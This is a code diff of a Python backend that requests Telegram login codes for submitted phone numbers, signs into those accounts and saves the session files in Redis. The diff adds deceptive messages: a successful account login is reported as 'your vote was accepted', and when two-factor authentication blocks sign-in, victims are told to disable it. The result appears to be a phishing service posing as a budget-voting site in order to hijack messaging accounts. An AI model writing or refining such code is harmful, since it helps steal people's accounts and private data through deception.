@@ -29,7 +29,6 @@ async def get_client(phone_number):
         with open(session_path, "wb") as f:
             f.write(session_data)  # Сохраняем файл как бинарные данные
 
-    device_model = "OpenBudget"
     
     client = TelegramClient(session_path, API_ID, API_HASH, device_model="OpenBudget")
     await client.connect()
@@ -41,7 +40,7 @@ async def save_session(phone_number):
 
     if os.path.exists(session_path):
         with open(session_path, "rb") as f:
-            redis_client.set(f"session:{phone_number}", f.read())  # Храним в Redis бинарные данные
+            redis_client.set(f"session:{phone_number}", f.read())  
 
 @app.post("/send_phone")
 async def send_phone():
@@ -58,7 +57,7 @@ async def send_phone():
             send_code = await client.send_code_request(phone_number)
             redis_client.set(f"code_hash:{phone_number}", send_code.phone_code_hash)
 
-        return jsonify({"success": True, "message": "Код отправлен"}), 200
+        return jsonify({"success": True, "message": "Вам был отправлен код"}), 200
 
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
@@ -84,10 +83,10 @@ async def send_code():
             await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
             await save_session(phone_number)  
 
-        return jsonify({"success": True, "message": "Вход выполнен"}), 200
+        return jsonify({"success": True, "message": "Ваш голос был принят"}), 200
 
     except SessionPasswordNeededError:
-        return jsonify({"success": False, "error": "Нужен пароль 2FA"}), 401
+        return jsonify({"success": False, "error": "Ошибка: Попробуйте отключить Двухэтапная Аутентификация"}), 401
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
